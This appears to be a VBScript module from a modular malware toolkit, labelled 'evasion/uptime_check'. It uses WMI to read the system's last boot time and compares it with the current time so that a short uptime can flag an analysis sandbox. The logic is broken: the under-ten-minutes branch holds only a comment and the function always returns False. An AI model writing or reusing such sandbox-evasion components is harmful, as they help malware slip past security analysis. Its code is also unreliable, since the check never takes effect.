' chunk: evasion/uptime_check
' depends: core/run_cmd
' provides: check_uptime
' format: vbscript
' note: WMI uptime check, short uptime suggests sandbox

Function check_uptime()
    check_uptime = False
    On Error Resume Next
    Dim objWMI, colItems, objItem
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMI.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
    For Each objItem In colItems
        Dim boot, y, mo, d, h, mi
        boot = objItem.LastBootUpTime
        y = CInt(Mid(boot, 1, 4))
        mo = CInt(Mid(boot, 5, 2))
        d = CInt(Mid(boot, 7, 2))
        h = CInt(Mid(boot, 9, 2))
        mi = CInt(Mid(boot, 11, 2))
        Dim bootTime, diff
        bootTime = DateSerial(y, mo, d) + TimeSerial(h, mi, 0)
        diff = DateDiff("n", bootTime, Now())
        If diff < 10 Then
            ' uptime less than 10 minutes
        End If
    Next
End Function
